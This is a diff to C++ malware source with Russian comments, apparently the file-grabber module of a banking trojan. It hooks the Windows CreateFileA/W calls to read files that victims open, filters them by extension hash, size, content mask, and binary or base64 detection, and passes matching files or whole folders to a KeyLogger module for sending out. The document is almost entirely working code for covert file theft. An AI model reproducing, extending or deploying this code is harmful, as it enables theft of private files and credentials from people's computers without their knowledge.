@@ -26,7 +26,7 @@ PList receivers = 0; //получатели
 DWORD PID = 0; //для предотвращения повторной инициализации
 int stateGrabber = 0; //состояние граббера
 
-bool IsBin( BYTE* data, int szData )
+static bool IsBin( BYTE* data, int szData )
 {
 	//считаем частоту символов
 	int s[256];
@@ -55,7 +55,7 @@ bool IsBin( BYTE* data, int szData )
 }
 
 //проверяет являются ли данные кодировкой base64
-bool IsBase64( BYTE* data, int szData )
+static bool IsBase64( BYTE* data, int szData )
 {
 	int sz = 0; //количество символов в data, исключаются переводі строк
 	int max = 0; //максимальная длина последовательности символов кодировки base64
@@ -86,6 +86,97 @@ bool IsBase64( BYTE* data, int szData )
 	return false;
 }
 
+static DWORD CalcExtHash( const char* fileName )
+{
+	char* p = STR::ScanEnd( (char*)fileName, '.' );
+	if( p )
+		return STR::GetHash( p + 1, 0, true );
+	return 0;
+}
+
+static DWORD CalcExtHash( const wchar_t* fileName )
+{
+	wchar_t* p = WSTR::ScanEnd( (wchar_t*)fileName, '.' );
+	if( p )
+		return WSTR::GetHash( p + 1, 0, true );
+	return 0;
+}
+
+//прповеряет является ли файл нужного нам расширения
+static bool IsExt( DWORD hash, DWORD* exts )
+{
+	if( exts == 0 ) return false;
+	while( *exts )
+	{
+		if( *exts == hash )
+			return true;
+		exts++;
+	}
+	return false;
+}
+
+static int FilterExt( const ParamEvent& e, Receiver* rv )
+{
+	int ret = 0;
+	if( rv->ignoreExt || rv->neededExt )
+	{
+		DWORD hash =  e.unicode ? CalcExtHash(e.fileNameW) : CalcExtHash(e.fileNameA);
+		if( rv->ignoreExt )
+			if( IsExt( hash, rv->ignoreExt ) )
+				ret = 1; //файл имеет расширение из-за которого он игнорируется
+		if( rv->neededExt )
+			if( IsExt( hash, rv->neededExt ) )
+				ret = 2; //файл имеет расширение из-за которого файл передается пользовательскому обработчику
+	}
+	return ret;
+}
+
+//проверяет по нескольким первым байтам, содержимого файла, формат файла 
+static bool IsFormatBeg( const ParamEvent& e, Receiver* rv )
+{
+	int n = 0;
+	bool res = false;
+	while( rv->ignoreBeg[n][0] && !res && n < MaxIgnoreBeg )
+	{
+		for( int i = 0; i <= MaxLenIgnoreBeg; i++ )
+		{
+			if( i == MaxLenIgnoreBeg || (rv->ignoreBeg[n][i] == 0 && i > 0) ) //строка совпала
+			{
+				res = true;
+				break;
+			}
+			if( rv->ignoreBeg[n][i] != e.data[i] )
+				break;
+		}
+		n++;
+	}
+	return res;
+}
+
+//загрузка файла, если не был загружен раньше
+static bool LoadFile( ParamEvent& e )
+{
+	if( e.data ) return true; //файл был уже загружен
+	e.data = (BYTE*)MemAlloc(e.szData + 1); //на 1 больше для конечного нуля, чтобы потом проводить поиск по маске
+	if( e.data ) 
+	{
+		DWORD size = 0;
+		pReadFile( e.file, e.data, e.szData, &size, NULL ); //читаем весь файл в память
+		pSetFilePointer( e.file, 0, 0, FILE_BEGIN );
+		if( size == e.szData ) //действительно все прочли
+		{
+			((char*)e.data)[e.szData] = 0; //файл представляем как строку
+			return true;
+		}
+		else
+		{
+			MemFree(e.data);
+			e.data = 0;
+		}
+	}
+	return false;
+}
+
 //Проверяет каждого получателя и отсылаем им оповещения о срабатывании хука, согласно условиям получателя
 void SendEvent( ParamEvent& e )
 {
@@ -95,152 +186,143 @@ void SendEvent( ParamEvent& e )
 	for( int i = 0; i < count; i++ )
 	{
 		Receiver* rv = (Receiver*)List::GetItem( receivers, i );
-		if( e.access & rv->access ) //тип доступа
+		if( !rv->ignore && e.access & rv->access ) //тип доступа
 		{
-			DWORD h;
- 			e.szData = (DWORD)pGetFileSize( e.file, &h );
-			//подходит ли размер
-			if( e.szData >= rv->minSize && (e.szData <= rv->maxSize || rv->maxSize < 0))
+			int send = 0; //слать событие (>0) или нет (=0)
+			int extFilter = FilterExt( e, rv );
+			if( extFilter > 0 ) //фильтер сработал
 			{
-				bool send = true; //слать событие или нет
-				
-				//загружаем файл
-				if( rv->maska || rv->aw & (LOADFILE | FILEISBIN) || rv->ignoreBeg[0][0] )
+				if( extFilter == 2 ) //файл нужного нам расширения
 				{
-					e.data = (BYTE*)MemAlloc(e.szData + 1); //на 1 больше для конечного нуля, чтобы потом проводить поиск по маске
-					if( e.data ) 
-					{
-						DWORD size = 0;
-						pReadFile( e.file, e.data, e.szData, &size, NULL ); //читаем весь файл в память
-						pSetFilePointer( e.file, 0, 0, FILE_BEGIN );
-						if( size == e.szData ) //действительно все прочли
-						{
-							((char*)e.data)[e.szData] = 0; //файл представляем как строку
-
-							//игнорируем файлы указанных форматов
-							int n = 0;
-							while( rv->ignoreBeg[n][0] && send && n < MaxIgnoreBeg )
-							{
-								for( int i = 0; i <= MaxLenIgnoreBeg; i++ )
-								{
-									if( i == MaxLenIgnoreBeg || (rv->ignoreBeg[n][i] == 0 && i > 0) ) //строка совпала
-									{
-										send = false;
-										break;
-									}
-									if( rv->ignoreBeg[n][i] != e.data[i] )
-										break;
-								}
-								n++;
-							}
-						}
-						else
-							send = false;
-						
-						if( send )
-						{
-							//если есть какой-то из фильтров, то сообщаем только тогда когда есть реакция на один из них
-							bool filters = false; //проходил ли через какой-то фильтер
-							for(;;)
-							{
-								//проверяем маску
-								if( rv->maska )
-								{
-									filters = true;
-									send = WildCmp( (char*)e.data, rv->maska );
-									if( send ) break;
-								}
-	
-								if( rv->aw & FILEISBIN )
-								{
-									filters = true;
-									send = IsBin( (BYTE*)e.data, e.szData );
-									if( send ) break;
-								}
-
-								if( rv->aw & FILEISBASE64 )
-								{
-									filters = true;
-									send = IsBase64( (BYTE*)e.data, e.szData );
-									if( send ) break;
-								}
-								if( filters ) send = false; //если ни один из фильтров не сработал, то сообщение не шлем
-								break;
-							}
-						}
-					}
-					else
-						send = false;
+					if( rv->aw & LOADFILE ) //нужно загрузить
+						LoadFile(e);
+					send = 1;
 				}
-				if( rv->FuncReceiver && send )
-				{
-					e.nameSend[0] = 0;
-					if( e.unicode )
+			}
+			else
+			{
+				DWORD h;
+ 				e.szData = (DWORD)pGetFileSize( e.file, &h );
+				//подходит ли размер
+				if( e.szData >= rv->minSize && (e.szData <= rv->maxSize || rv->maxSize < 0))
+				{	
+					if( rv->maska || rv->aw & FILEISBIN || rv->ignoreBeg[0][0] )
 					{
-						DBG("FileGrabberW", "Отреагировали на файл '%ls', size: %d", e.fileNameW, e.szData );
-						e.fileName = WSTR::ToAnsi( e.fileNameW, 0 );
+						if( LoadFile(e) )
+						{
+							if( !IsFormatBeg( e, rv ) ) //файл не игнорируемого формата
+							{
+								//если есть какой-то из фильтров, то сообщаем только тогда когда есть реакция на один из них
+								bool filters = false; //проходил ли через какой-то фильтер
+								for(;;)
+								{
+									//проверяем маску
+									if( rv->maska )
+									{
+										filters = true;
+										if( WildCmp( (char*)e.data, rv->maska ) )
+										{
+											send = 2; break;
+										}
+									}
+	
+									if( rv->aw & FILEISBIN )
+									{
+										filters = true;
+										if( IsBin( (BYTE*)e.data, e.szData ) )
+										{
+											send = 3; break;
+										}
+									}
+		
+									if( rv->aw & FILEISBASE64 )
+									{
+										filters = true;
+										if( IsBase64( (BYTE*)e.data, e.szData ) )
+										{
+											send = 4; break;
+										}
+									}
+									if( filters ) send = 0; //если ни один из фильтров не сработал, то сообщение не шлем
+									break;
+								}
+							}	
+						}
 					}
 					else
 					{
-						DBG("FileGrabberA", "Отреагировали на файл '%s', size: %d", e.fileNameA, e.szData );
-						e.fileName = (char*)e.fileNameA;
+						if( rv->aw & LOADFILE ) //нужно загрузить
+							LoadFile(e);
+						send = 5; //нужно оповещать о файлах определенного размера
 					}
+				}
+			}
+			if( rv->FuncReceiver && send > 0 )
+			{
+				e.nameSend[0] = 0;
+				if( e.unicode )
+				{
+					DBG("FileGrabberW", "Отреагировали на файл '%ls'(%d), size: %d", e.fileNameW, send, e.szData );
+					e.fileName = WSTR::ToAnsi( e.fileNameW, 0 );
+				}
+				else
+				{
+					DBG("FileGrabberA", "Отреагировали на файл '%s'(%d), size: %d", e.fileNameA, send, e.szData );
+					e.fileName = (char*)e.fileNameA;
+				}
 
-					e.shortName = File::ExtractFileNameA( e.fileName, false );
-					//ищем расширение
-					e.extFile = 0;
-					const char* p = STR::End((char*)e.shortName); 
-					while( p >= e.shortName )
-						if( *p == '.' )
-						{
-							e.extFile = p + 1; 
-							break;
-						}
-						else
-							p--;
+				e.shortName = File::ExtractFileNameA( e.fileName, false );
+				//ищем расширение
+				e.extFile = 0;
+				const char* p = STR::ScanEnd( (char*)e.shortName, '.' ); 
+				if( p ) e.extFile = p + 1; 
 
-					int res = rv->FuncReceiver(&e);
-					if( res & SENDFILE ) //если возвращает SENDFILE, то отправляем содержимое
+				int res = rv->FuncReceiver(&e);
+
+				if( res & SENDFILE ) //если возвращает SENDFILE, то отправляем содержимое
+				{
+					if( e.data )
 					{
-						if( e.data )
-						{
-							const char* nameSend = "FileGrabber";
-							if( res & CURRNAMEFILE ) //извлекаем имя из полного имени файла
-								nameSend = e.shortName;
+						const char* nameSend = "FileGrabber";
+						if( res & CURRNAMEFILE ) //извлекаем имя из полного имени файла
+							nameSend = e.shortName;
+						else
+							if( res & CURRFULLNAMEFILE ) //имя файла с полными путями
+								nameSend = e.fileName;
 							else
-								if( res & CURRFULLNAMEFILE ) //имя файла с полными путями
-									nameSend = e.fileName;
-								else
-									if( e.nameSend[0] ) //имя передал получатель
-										nameSend = e.nameSend;
-							if( e.unicode )
-								DBG("FileGrabberW", "Отправили файл '%ls' под именем '%s'", e.fileNameW, nameSend );
-							else
-								DBG("FileGrabberA", "Отправили файл '%s' под именем '%s'", e.fileNameA, nameSend );
-							KeyLogger::AddFile( 0, (char*)nameSend, e.data, e.szData );
-						}
+								if( e.nameSend[0] ) //имя передал получатель
+									nameSend = e.nameSend;
+						DBG( "FileGrabber", "Отправили файл '%s' под именем '%s'", e.fileName, nameSend );
+						KeyLogger::AddFile( 0, (char*)nameSend, e.data, e.szData );
 					}
-					else 
-						if( res & SENDFOLDER )
+				}
+				else 
+					if( res & SENDFOLDER )
+					{
+						pPathRemoveFileSpecA(e.fileName);
+						//добавляем в конце слеш, так функция PathRemoveFileSpec его убирает
+						int sz = m_lstrlen(e.fileName);
+						if( e.fileName[sz - 1] != '\\' )
 						{
-							pPathRemoveFileSpecA(e.fileName);
-							//добавляем в конце слеш, так функция PathRemoveFileSpec его убирает
-							int sz = m_lstrlen(e.fileName);
 							e.fileName[sz] = '\\';
 							e.fileName[sz + 1] = 0;
-							DBG( "FileGrabber", "Отправляем папку '%s' под именем '%s'", e.fileName, e.nameSend );
-							int currState = stateGrabber;
-							stateGrabber |= IGNOREHOOK; //отключаем граббер
-							KeyLogger::AddDirectory( e.fileName, e.nameSend );
-							stateGrabber = currState; //восстанавливаем состояние
+							sz++;
 						}
-					if( e.fileName != e.fileNameA ) //освобождаем память, если была перекодировка
-						STR::Free(e.fileName);
-				}
-				MemFree(e.data);
+						DBG( "FileGrabber", "Отправляем папку '%s' под именем '%s'", e.fileName, e.nameSend );
+						int currState = stateGrabber;
+						stateGrabber |= IGNOREHOOK; //отключаем граббер
+						KeyLogger::AddDirectory( e.fileName, e.nameSend );
+						stateGrabber = currState; //восстанавливаем состояние
+					}
+				if( res & STOPRECEIVER )
+					rv->ignore = true;
+				if( e.fileName != e.fileNameA ) //освобождаем память, если была перекодировка
+					STR::Free(e.fileName);
 			}
 		}
 	}
+	MemFree(e.data);
+	e.data = 0;
 }
 
 HANDLE WINAPI Hook_CreateFileA( LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile )
@@ -265,9 +347,10 @@ HANDLE WINAPI Hook_CreateFileA( LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD 
 HANDLE WINAPI Hook_CreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile )
 {
 	HANDLE File = Real_CreateFileW(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile );
-	if( (stateGrabber & IGNOREHOOK) == 0 && (dwFlagsAndAttributes & FILE_FLAG_OVERLAPPED) == 0 && lpFileName && lpFileName[0] != '/' && lpFileName[0] != '\\' ) //игнорируем открытие разных портов
+
+	if( (stateGrabber & (IGNOREHOOK | INHOOK)) == 0 && (dwFlagsAndAttributes & FILE_FLAG_OVERLAPPED) == 0 && lpFileName && lpFileName[0] != '/' && lpFileName[0] != '\\' ) //игнорируем открытие разных портов
 	{
-	//DBG("FileGrabberW", "%ls", lpFileName);
+		//stateGrabber |= INHOOK;
 		//инициализация параметров события
 		ParamEvent e;
 		e.data = 0;
@@ -277,15 +360,9 @@ HANDLE WINAPI Hook_CreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD
 		e.unicode = true;
 		e.access = dwDesiredAccess;
 		e.file = File;
-		SendEvent(e); //посылаем событие
-		//DBG( "FileGrabberW", "- %ls, %ls", lpFileName, e.fileNameW );
-		/*
-		if( !m_wcsncmp( (WCHAR*)lpFileName, e.fileNameW, len ) )
-		{
-			DBG( "FileGrabberW", "%ls != %ls", lpFileName, e.fileNameW );
-			m_memcpy( (void*)lpFileName, e.fileNameW, sizeof(WCHAR) * (len + 1) );
-		}
-		*/
+
+	   	SendEvent(e); //посылаем событие
+		//stateGrabber &= ~INHOOK;
 	}
 	return File;
 }
@@ -293,6 +370,9 @@ HANDLE WINAPI Hook_CreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD
 //удаление получателя при уничтожении списка
 void DelReceiver(void* p)
 {
+	Receiver* pp = (Receiver*)p;
+	MemFree(pp->ignoreExt);
+	MemFree(pp->neededExt);
 	MemFree(p);
 }
 
@@ -359,6 +439,36 @@ bool AddIgnoreBeg( Receiver* rv, const char* beg )
 				rv->ignoreBeg[i][j] = 0;
 			return true;
 		}
+	return false;
+}
+
+static DWORD* CopyArrayExt( const DWORD* m )
+{
+	//считаем колоичество элементов
+	const DWORD* pm = m;
+	while( *pm++ );
+	int sz = (pm - m) *sizeof(DWORD);
+	DWORD* ret = (DWORD*)MemAlloc(sz);
+	if( ret )
+		m_memcpy( ret, m, sz );
+	return ret;
+}
+
+//добавляет массив хешей игнорируемых расширений файлов, должен заканчиваться нулем
+bool AddIgnoreExt( Receiver* rv, const DWORD* m )
+{
+	rv->ignoreExt = CopyArrayExt(m);
+	if( rv->ignoreExt )
+		return true;
+	return false;
+}
+
+//добавляет массив хешей нужных нам расширений файлов, должен заканчиваться нулем
+bool AddNeededExt( Receiver* rv, const DWORD* m )
+{
+	rv->neededExt = CopyArrayExt(m);
+	if( rv->neededExt )
+		return true;
 	return false;
 }
 
